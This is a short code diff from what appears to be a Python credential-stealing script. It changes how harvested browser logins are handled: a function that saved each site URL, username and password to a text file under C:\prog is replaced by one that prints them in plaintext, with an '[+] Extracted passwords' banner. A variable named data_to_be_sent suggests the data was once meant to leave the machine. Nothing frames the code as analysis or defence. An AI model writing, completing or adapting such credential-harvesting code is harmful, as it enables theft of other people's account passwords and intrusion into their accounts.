@@ -13,7 +13,7 @@ except ImportError:
 def main():
     data = get_passwords()
     if data:
-        save_locally(data)
+        print_passwords(data)
 
 
 def get_passwords():
@@ -53,15 +53,12 @@ def get_passwords():
     return data_to_be_sent
 
 
-def save_locally(data):
-    try:
-        output_path = os.path.join("C:\\prog", f"{data['user']}_passwords.txt")
-        with open(output_path, "w", encoding="utf-8") as writer:
-            for entry in data['passwords']:
-                writer.write(json.dumps(entry, indent=2) + "\n")
-        print(f"[+] Passwords saved locally to: {output_path}")
-    except Exception as e:
-        print(f"[!] Failed to save passwords: {e}")
+def print_passwords(data):
+    print(f"[+] Extracted passwords for user: {data['user']}\n")
+    for entry in data['passwords']:
+        print(f"URL: {entry['origin_url']}")
+        print(f"Username: {entry['username']}")
+        print(f"Password: {entry['password']}\n")
 
 
 def get_path():
